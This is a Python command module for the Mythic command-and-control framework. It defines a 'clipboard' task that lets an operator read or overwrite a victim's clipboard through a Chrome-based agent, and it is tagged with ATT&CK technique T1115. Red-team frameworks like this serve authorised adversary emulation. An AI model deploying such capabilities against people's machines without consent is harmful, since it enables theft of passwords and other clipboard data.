from mythic_container.MythicCommandBase import *

from .tasking import wired_tasking


class ClipboardArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["read", "write"],
                default_value="read",
                description="Clipboard action",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="text",
                type=ParameterType.String,
                description="Text to write",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            return
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        pieces = self.command_line.split(maxsplit=1)
        if pieces[0] in {"read", "write"}:
            self.add_arg("action", pieces[0])
            if len(pieces) > 1:
                self.add_arg("text", pieces[1])
        else:
            self.add_arg("action", "write")
            self.add_arg("text", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class ClipboardCommand(CommandBase):
    cmd = "clipboard"
    needs_admin = False
    help_cmd = "clipboard [read|write]"
    description = "Read or write the clipboard via an offscreen document"
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1115"]
    argument_class = ClipboardArguments
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        return wired_tasking(taskData, taskData.args.get_arg("action") or "read")

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
